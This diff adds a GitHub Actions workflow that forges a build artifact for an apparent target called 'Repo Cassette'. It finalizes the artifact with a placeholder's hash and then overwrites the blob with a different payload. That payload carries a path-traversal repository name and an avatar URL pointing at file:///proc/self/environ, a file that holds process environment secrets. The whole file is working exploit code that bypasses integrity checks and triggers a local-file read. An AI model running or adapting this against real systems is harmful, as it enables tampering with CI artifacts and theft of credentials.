@@ -1,0 +1,83 @@
+name: Forge Repo Cassette artifact
+
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24.22.1
+      - name: Install the artifact client
+        run: npm install --no-save --package-lock=false @actions/artifact@6.3.1
+      - name: Forge the raw artifact
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import { createHash } from 'node:crypto';
+          import { BlobClient } from '@azure/storage-blob';
+
+          const artifactEntry = import.meta.resolve('@actions/artifact');
+          const artifactLib = new URL('.', artifactEntry);
+          const [{ internalArtifactTwirpClient }, { getBackendIdsFromToken }, { StringValue }] = await Promise.all([
+            import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
+            import(new URL('internal/shared/util.js', artifactLib)),
+            import(new URL('generated/index.js', artifactLib)),
+          ]);
+
+          const size = 4096;
+          const ids = getBackendIdsFromToken();
+          const client = internalArtifactTwirpClient();
+          const contentType = Buffer.concat([
+            Buffer.from('application/json', 'ascii'),
+            Buffer.from([0x85]),
+          ]).toString('latin1');
+          const name = `cassette-${process.env.GITHUB_RUN_ID}-${process.env.GITHUB_RUN_ATTEMPT}.json`;
+          const sha256 = data => createHash('sha256').update(data).digest('hex');
+
+          const created = await client.CreateArtifact({
+            workflowRunBackendId: ids.workflowRunBackendId,
+            workflowJobRunBackendId: ids.workflowJobRunBackendId,
+            name,
+            mimeType: StringValue.create({ value: contentType }),
+            version: 7,
+          });
+          if (!created.ok || !created.signedUploadUrl) throw new Error('CreateArtifact failed');
+
+          const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
+          const options = { blobHTTPHeaders: { blobContentType: contentType } };
+          const placeholder = Buffer.concat([Buffer.from('{}'), Buffer.alloc(size - 2, 0x20)]);
+          await blob.uploadData(placeholder, options);
+
+          const finalized = await client.FinalizeArtifact({
+            workflowRunBackendId: ids.workflowRunBackendId,
+            workflowJobRunBackendId: ids.workflowJobRunBackendId,
+            name,
+            size: String(size),
+            hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
+          });
+          if (!finalized.ok || !/^\d+$/.test(finalized.artifactId)) throw new Error('FinalizeArtifact failed');
+
+          const repository = `x/../${process.env.GITHUB_REPOSITORY}/actions/artifacts/${finalized.artifactId}/zip`;
+          const document = {
+            full_name: repository,
+            owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
+            description: 'Repo Cassette',
+            stargazers_count: 0,
+          };
+          const json = Buffer.from(JSON.stringify(document));
+          if (json.length > size) throw new Error('Payload is too large');
+          const payload = Buffer.concat([json, Buffer.alloc(size - json.length, 0x20)]);
+          await blob.uploadData(payload, options);
+
+          console.log(`OWNER_REPO=${process.env.GITHUB_REPOSITORY}`);
+          console.log(`ARTIFACT_ID=${finalized.artifactId}`);
+          console.log(`REPOSITORY=${repository}`);
+          console.log(`PAYLOAD_SHA256=${sha256(payload)}`);
+          NODE
